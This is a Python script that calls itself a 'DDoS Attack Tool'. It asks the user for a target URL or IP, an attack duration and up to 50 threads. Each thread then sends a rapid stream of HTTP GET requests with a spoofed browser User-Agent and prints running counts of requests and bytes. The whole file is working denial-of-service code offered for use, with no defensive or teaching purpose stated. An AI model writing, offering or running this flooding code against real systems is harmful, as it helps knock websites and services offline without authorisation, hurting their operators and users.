from colorama import Fore, Style
import requests
import threading
import time
import random

def http_flood(target, duration):
    end_time = time.time() + duration
    packets_sent = 0
    bytes_sent = 0
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'}
    
    while time.time() < end_time:
        try:
            response = requests.get(target, headers=headers, timeout=2)
            packets_sent += 1
            bytes_sent += len(response.content) if response.content else 0
            print(f"{Fore.MAGENTA}[*] Sending Request: {packets_sent:,} | Bytes Sent: {bytes_sent:,} | Status: {response.status_code}{Style.RESET_ALL}")
        except Exception:
            packets_sent += 1
            print(f"{Fore.RED}[*] Sending Request: {packets_sent:,} | Connection Failed{Style.RESET_ALL}")
        time.sleep(random.uniform(0.1, 0.5))
    
    return packets_sent, bytes_sent

def start_ddos(config):
    print(f"{Fore.CYAN}=== DDoS Attack Tool ==={Style.RESET_ALL}")
    target = config['target_ip'] if config['ddos_method'] == 'HTTP' else input(f"{Fore.GREEN}Enter Target URL/IP > {Style.RESET_ALL}")
    method = config['ddos_method']
    duration = int(input(f"{Fore.GREEN}Enter Attack Duration (seconds) > {Style.RESET_ALL}"))
    threads = int(input(f"{Fore.GREEN}Enter Number of Threads (1-50) > {Style.RESET_ALL}"))
    threads = min(max(threads, 1), 50)  # Limit threads
    
    print(f"{Fore.YELLOW}Target: {target}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Attack Method: {method}{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Launching Attack...{Style.RESET_ALL}")
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=http_flood, args=(f"http://{target}" if not target.startswith(('http://', 'https://')) else target, duration))
        t.daemon = True
        thread_list.append(t)
        t.start()
        print(f"{Fore.MAGENTA}[*] Thread {i+1}/{threads} Started{Style.RESET_ALL}")
        time.sleep(0.1)
    
    for t in thread_list:
        t.join()
    
    print(f"{Fore.GREEN}[+] Attack Completed!{Style.RESET_ALL}")
    input(f"{Fore.GREEN}Press Enter to Return to Menu > {Style.RESET_ALL}")
